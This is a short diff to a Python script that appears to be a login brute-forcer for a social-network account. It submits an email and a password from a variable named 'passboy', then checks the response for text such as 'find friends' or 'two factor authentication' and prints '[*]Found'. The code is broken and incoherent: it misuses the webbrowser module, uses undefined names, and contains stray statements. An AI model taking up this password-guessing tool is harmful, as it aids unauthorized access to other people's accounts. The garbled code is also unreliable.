@@ -1,3 +1,4 @@
+from http.client import responses
 import sys
 import requests
 from ast import Break, Try
@@ -32,9 +33,11 @@ response = webbrowser.open(post_url)
     
 if responses: code = 200
 webbrowser.select_form(nr=0)
-webbrowser.select['email']=email
-webbrowser.select['password']= passboy
-requests=webbrowser.submit()
+y = webbrowser.select_form(nr=0)
+z = webbrowser.select_form(nr=1)
+webbrowser.set_value[y] = email
+webbrowser.set_value[z] = passboy
+responses=webbrowser.submit()
 responses_data=response.read()
 'find friends' in responses_data or 'two factor authentication' in responses_data or 'security code' in  responses_data;
 print("[*]Found:%s"%content)
